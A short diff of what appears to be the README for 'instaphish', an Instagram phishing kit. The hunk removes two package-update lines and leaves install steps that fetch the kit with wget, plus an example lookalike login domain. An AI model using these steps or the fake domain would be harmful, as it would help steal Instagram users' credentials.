@@ -6,8 +6,6 @@ Ex: <a href="https://instagramloginapp.ml">INSTAGRAMLOGINAPP.ML</a>
 
 #### STEP 1 (Clone the script)
 ```
-* apt get update
-* apt get upgrade
 * pkg install wget
 * wget https://github.com/adithziva/instaphish
 ```
